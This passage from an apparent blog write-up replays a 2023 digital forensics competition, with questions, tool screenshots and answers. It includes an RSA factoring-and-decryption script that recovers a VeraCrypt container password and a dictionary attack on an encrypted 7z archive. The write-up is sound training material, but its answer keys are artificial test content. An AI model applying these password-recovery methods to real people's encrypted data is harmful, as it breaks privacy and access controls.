title="question17"></a>question17</h2><p>分析技术人员电脑内的手机流量包，给出技术人员的虚拟身份密码是？[答案格式:b3039456655]</p><h2 id="question18"><a href="#question18" class="headerlink" title="question18"></a>question18</h2><p>分析技术人员电脑内的手机流量包，分析技术人员的看过几段短视频？[答案格式:3]</p><h2 id="question19"><a href="#question19" class="headerlink" title="question19"></a>question19</h2><p>分析技术人员电脑内的手机流量包，分析技术人员最后打开的软件的程序名称是？[答案格式:微信]</p><h2 id="question20"><a href="#question20" class="headerlink" title="question20"></a>question20</h2><p>分析技术人员电脑内的手机流量包，分析安全防护的服务器地址是？[答案格式:127.0.0.1]</p><h1 id="移动智能终端取证"><a href="#移动智能终端取证" class="headerlink" title="移动智能终端取证"></a>移动智能终端取证</h1><h2 id="question1"><a href="#question1√-1" class="headerlink" title="question1√"></a>question1√</h2><p>分析卡农手机，给出手机的SDK版本？[答案格式:28]</p><p>这题火眼就梭不出来了，这里要直接使用搓，并且也不能直接把文件一键解压（耗时太久），直接访问压缩包</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106154910323.png" alt="image-20251106154910323"></p><p>打开<code>deviceinfo.json</code>文件，搜索sdk即可</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106154812025.png" alt="image-20251106154812025"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">30</span><br></pre></td></tr></table></figure><h2 id="question2"><a href="#question2" class="headerlink" title="question2"></a>question2</h2><p>分析卡农手机，给出手机最近开机的时间？[答案格式:2023-05-18-19:09:59]</p><h2 id="question3"><a href="#question3" class="headerlink" title="question3"></a>question3</h2><p>分析卡农手机，给出高德地图关联的手机号是？[答案格式:13011221234]</p><h2 id="question4"><a href="#question4" class="headerlink" title="question4"></a>question4</h2><p>分析卡农手机，给出卡农内部聊天工具的昵称是？[答案格式:李多余]</p><h2 id="question5"><a href="#question5" class="headerlink" title="question5"></a>question5</h2><p>分析卡农手机，给出卡农的真实名字可能是？[答案格式:李多余]</p><h1 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h1><h2 id="question1"><a href="#question1√-2" class="headerlink" title="question1√"></a>question1√</h2><p>黑客计算机系统安装时间是？[答案格式:2000/01/01 01:00:01]</p><p>这题就直接火眼一把梭即可</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106111447630.png" alt="image-20251106111447630"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023/05/10 13:31:47</span><br></pre></td></tr></table></figure><h2 id="question2"><a href="#question2√-1" class="headerlink" title="question2√"></a>question2√</h2><p>黑客计算机磁盘0的总磁道数？[答案格式:数字中无标点]</p><p>这题一开始做也不知道去哪里找，看了wp才知道直接看系统信息就行了，感觉还是太依赖宏联一把梭工具了。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106112238072.png" alt="image-20251106112238072"></p><h2 id="question3"><a href="#question3√-1" class="headerlink" title="question3√"></a>question3√</h2><p>黑客计算机的产品密钥是？[答案格式:字母大写]</p><p>无语了，计算机的产品密钥把它误认为BitLocker恢复密钥了。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106112736576.png" alt="image-20251106112736576"></p><h2 id="question4"><a href="#question4-1" class="headerlink" title="question4?"></a>question4?</h2><p>黑客计算机共有几次卷影拷贝服务关闭事件？[答案格式:1]</p><p>这题存疑，思路就是看日志，直接仿真机用事件查看器看即可。</p><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106115223306.png" alt="image-20251106115223306"></p><p>卷影拷贝服务其实就是<code>VSS</code>，只要找到<code>VSS</code>就行了。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106115423093.png" alt="image-20251106115423093"></p><ul><li>但是这里只有一个<code>VSS</code>脱机关闭日志，而答案是两个，这题存疑</li></ul><h3 id="vss服务"><a href="#VSS服务" class="headerlink" title="VSS服务"></a>VSS服务</h3><p>看这篇文章做了解：<a href="https://www.cnblogs.com/suv789/p/17777417.html">卷影副本（Volume Shadow Copy）是Windows操作系统提供的一项备份和恢复功能。它允许在文件被修改或删除之前，创建文件或文件夹的副本，以便在需要时进行数据的还原和恢复。卷影副本主要有以下作用和优势 - suv789 - 博客园</a></p><h2 id="question5"><a href="#question5√-1" class="headerlink" title="question5√"></a>question5√</h2><p>黑客计算机的vc容器解密密码是？[答案格式:字母小写]</p><p>在仿真机上可以看到<code>VC</code>容器密码这个文件夹，但是发现<code>vc</code>容器密码被RSA加密过了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106115719838.png" alt="image-20251106115719838"></p><p>这个对于密码手还比较容易的，但是还有个问题该文件只有公钥没有私钥，先不用管先把公钥提取出来再说，先导出公钥和密文</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106120003224.png" alt="image-20251106120003224"></p><p>使用Python提取公钥，发现n比较大，虽然有个小模数，但是yafu分解不出来（可能是我的yafu版本太低了）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line">pub_path = <span class="string">r&quot;F:\2023盘古石\pub.key&quot;</span></span><br><span class="line">c_path = <span class="string">r&quot;F:\2023盘古石\m&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">pem = <span class="built_in">open</span>(pub_path,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">pub_key = serialization.load_pem_public_key(pem.read())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,pub_key.public_numbers())</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;RSAPublicNumbers(e=65537, n=18762288330807505336471569952368628968038915032364773203018829070696227411217877868952724842039756288121734420378039301563905037169196320417706839549744629044465352679919380329435329653365900312498712121432190200717072138327379844913608851715404086200984072727408758802012147296753317519612628629535373054730645471938738605688629618951071483635716677866010394704066696480858977560809007683074249820225609075518509112704549293147063971302640066331096645041521401155565628466857211261242132897152403975836705170916276159246187173035660820037820087171748591660487636434105623595720788169970861783452500198572918584010881)&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>使用sage尝试分解一下，发现<code>sage</code>可以比较快的分解出来</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106122227851.png" alt="image-20251106122227851"></p><p>那就直接正常的解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c_path = <span class="string">r&quot;F:\2023盘古石\m&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=<span class="number">18762288330807505336471569952368628968038915032364773203018829070696227411217877868952724842039756288121734420378039301563905037169196320417706839549744629044465352679919380329435329653365900312498712121432190200717072138327379844913608851715404086200984072727408758802012147296753317519612628629535373054730645471938738605688629618951071483635716677866010394704066696480858977560809007683074249820225609075518509112704549293147063971302640066331096645041521401155565628466857211261242132897152403975836705170916276159246187173035660820037820087171748591660487636434105623595720788169970861783452500198572918584010881</span></span><br><span class="line">p = <span class="number">250527704258269</span></span><br><span class="line">q = <span class="number">74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349</span></span><br><span class="line">c_ = <span class="built_in">open</span>(c_path,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = c_.read()</span><br><span class="line">c = bytes_to_long(c)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106122523231.png" alt="image-20251106122523231"></p><ul><li>答案：</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byebyedisco</span><br></pre></td></tr></table></figure><h2 id="question6"><a href="#question6√-1" class="headerlink" title="question6√"></a>question6√</h2><p>黑客计算机加密容器中共有几个docx文件？[答案格式:x]</p><p>有了容器密码就可以直接挂载了，现在我们要找到相应的容器，这里其实加密的是它电脑上的一个盘，这里发现有一个<code>E</code>盘，但是打不开。这个就是被加密的盘</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106123025313.png" alt="image-20251106123025313"></p><p>打开仿真机中的<code>VC</code>加密应用</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106123250885.png" alt="image-20251106123250885"></p><p>这样即可解密出被加密的磁盘</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106123315422.png" alt="image-20251106123315422"></p><p>查看被加密的磁盘里面的内容会发现有4个文档，其中有三个<code>.docx</code>文档</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106123343541.png" alt="image-20251106123343541"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="question7"><a href="#question7√-1" class="headerlink" title="question7√"></a>question7√</h2><p>黑客计算机加密容器中记录的bt币地址有几个？[答案格式:x]</p><p>根据题目内容，直接查看容器中<code>bt币地址与受害人</code>这个表格即可，但是和我想的不一样。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106123627150.png" alt="image-20251106123627150"></p><p>这个时候需要用到美亚取证大师的<code>vc</code>解密，火眼的<code>vc</code>解密有点问题</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106132224028.png" alt="image-20251106132224028"></p><ul><li>这里还要介绍一下<code>PIM</code>值</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106132252808.png" alt="image-20251106132252808"></p><ul><li>填入<code>PIM</code>值和密码之后就会出现这样，输入默认<code>PIM</code>值<code>0</code>以及前面的密码<code>byebyedisco</code>即可解密</li><li>解密后翻找目录会发现这个<code>tmp</code>文件，导出这个文件，然后使用<code>zip</code>后缀，解压缩后就会看到</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106132644879.png" alt="image-20251106132644879"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106132716370.png" alt="image-20251106132716370"></p><ul><li>点开来看，发现有4个地址</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106132732797.png" alt="image-20251106132732797"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4</span><br></pre></td></tr></table></figure><h2 id="question8"><a href="#question8√-1" class="headerlink" title="question8√"></a>question8√</h2><p>黑客计算机加密容器中记录的受害人共有多少人？[答案格式:xx]</p><ul><li>直接就看加密容器中的<code>xlsx</code>文件，发现有<code>29</code>个</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106132832135.png" alt="image-20251106132832135"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">29</span></span><br></pre></td></tr></table></figure><h2 id="question9"><a href="#question9√-1" class="headerlink" title="question9√"></a>question9√</h2><p>黑客计算机中win7虚拟机中www用户的登陆密码是？[答案格式:xxxxxxx]</p><p>这个时候就要看<code>disk1.E01</code>这个镜像了，发现有一个<code>win7.7z</code>的压缩包，原本想直接用火眼提取一下，结果发现提取不出来，直接就在资源管理器打开即可。打开后复制一份到别的地方。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106133334079.png" alt="image-20251106133334079"></p><p>然后进行解压操作，发现该压缩包还有密码</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106133740595.png" alt="image-20251106133740595"></p><p>这个就还需要爆破密码，而爆破密码的字典是前面黑客上传的<code>.txt</code>文件的内容，这里有个软件比较好用<code>Passware Kit Forensic</code>，使用该软件进行压缩包的密钥爆破，获取地址：<a href="https://mp.weixin.qq.com/s/1IGb2tMPjxAwIMwpebfL7A">密码恢复神器-Passware Kit Forensic</a></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106135434986.png" alt="image-20251106135434986"></p><p>将文件拖入进去</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106135608234.png" alt="image-20251106135608234"></p><p>选择自定义设置</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106140016379.png" alt="image-20251106140016379"></p><p>选择字典攻击，并双击进行设置</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106140035534.png" alt="image-20251106140035534"></p><p>使用流量包的那个<code>.txt</code>文件</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106140114185.png" alt="image-20251106140114185"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106140142797.png" alt="image-20251106140142797"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106140154940.png" alt="image-20251106140154940"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106140210668.png" alt="image-20251106140210668"></p><p>没开gpu爆还是太慢了，直接开gpu爆</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106140957724.png" alt="image-20251106140957724"></p><p>最后找到密码为<code>zymogenesis</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106141308429.png" alt="image-20251106141308429"></p><p>然后就可以开始解压了，解压之后发现是虚拟机文件，先放入火眼去取</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106141616579.png" alt="image-20251106141616579"></p><p>将镜像文件丢给火眼就能看到密码了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106142247693.png" alt="image-20251106142247693"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12345678</span></span><br></pre></td></tr></table></figure><h2 id="question10"><a href="#question10√-1" class="headerlink" title="question10√"></a>question10√</h2><p>黑客计算机中win7虚拟机中chrome浏览“bjh.com”网站保存的密码是？[答案格式:xx]</p><p>这题火眼也直接一把梭了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106142353258.png" alt="image-20251106142353258"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin123!@<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="question11"><a href="#question11√-1" class="headerlink" title="question11√"></a>question11√</h2><p>分析技术人员电脑，请给出电脑系统安装时间（UTC-0）?[答案格式:20000-01-01 00:00:00]</p><p>这题也就火眼一把梭即可，转换为<code>UTC-0</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106143539007.png" alt="image-20251106143539007"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2023</span>-04-<span class="number">19</span> 06:<span class="number">10</span>:<span class="number">50</span></span><br></pre></td></tr></table></figure><h2 id="question12"><a href="#question12√-1" class="headerlink" title="question12√"></a>question12√</h2><p>分析技术人员电脑，请给出电脑内用户John的SID？[答案格式:x-x-x-x-x-x-x-x]</p><p>继续火眼一把梭</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106143626828.png" alt="image-20251106143626828"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">2950582214</span>-<span class="number">2327523445</span>-<span class="number">121360615</span>-<span class="number">1001</span></span><br></pre></td></tr></table></figure><h2 id="question13"><a href="#question13√-1" class="headerlink" 